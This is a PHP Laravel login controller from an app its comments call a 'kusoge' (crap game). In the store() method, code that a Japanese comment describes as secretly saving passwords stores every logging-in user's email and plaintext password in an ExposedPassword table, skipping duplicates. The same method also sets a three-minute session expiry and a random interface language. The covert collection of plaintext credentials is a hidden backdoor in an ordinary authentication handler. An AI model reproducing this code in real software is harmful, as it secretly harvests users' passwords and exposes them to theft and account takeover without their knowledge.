<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;
use App\Models\ExposedPassword;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): View
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        // 1. まず普通に認証する
        $request->authenticate();

        $request->session()->regenerate();

        // ★★★ 追加：ここでパスワードをこっそり保存（重複チェック付き） ★★★
        $email = $request->email;
        $pass  = $request->password;

        // 「同じメアド」かつ「同じパスワード」がまだ保存されていなければ保存
        $exists = \App\Models\ExposedPassword::where('email', $email)
                    ->where('password', $pass)
                    ->exists();

        if (!$exists) {
            \App\Models\ExposedPassword::create([
                'user_id'  => Auth::id(),
                'email'    => $email,
                'password' => $pass,
                'source'   => 'Login', // ログイン時に収集
            ]);
        }

        // ★★★ 以下のクソゲー設定（タイマー＆ランダム言語）はそのまま ★★★
        session(['kusoge_expires_at' => now()->addMinutes(3)]);
        
        $langs = ['ja', 'en', 'zh_CN', 'ar', 'ru', 'th', 'hi', 'ko', 'fr', 'de']; 
        session(['kusoge_locale' => $langs[array_rand($langs)]]);

        return redirect()->intended(route('dashboard', absolute: false));
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}